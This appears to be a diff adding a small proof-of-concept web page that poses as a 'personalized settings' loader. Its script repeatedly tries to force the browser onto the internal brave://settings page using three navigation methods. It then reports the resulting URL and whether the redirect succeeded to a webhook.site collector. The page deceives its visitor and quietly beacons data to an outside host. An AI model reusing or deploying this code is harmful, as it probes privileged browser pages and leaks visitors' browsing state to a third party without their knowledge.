@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>Redirecting to settings...</title></head>
+<body>
+  <h1>Loading your personalized settings...</h1>
+  <p>Please wait while we redirect you.</p>
+  <script>
+    // Try multiple redirect methods
+    setTimeout(function() {
+      // Method 1: location.href
+      try { window.location.href = 'brave://settings'; } catch(e) {}
+    }, 1000);
+    setTimeout(function() {
+      // Method 2: location.replace 
+      try { window.location.replace('brave://settings'); } catch(e) {}
+    }, 2000);
+    setTimeout(function() {
+      // Method 3: window.open
+      try { window.open('brave://settings', '_self'); } catch(e) {}
+    }, 3000);
+    // Report what happened
+    setTimeout(function() {
+      new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?redirect_result=' + 
+        encodeURIComponent(JSON.stringify({
+          finalURL: window.location.href,
+          redirected: window.location.href.includes('brave://')
+        }));
+    }, 4000);
+  </script>
+</body>
+</html>
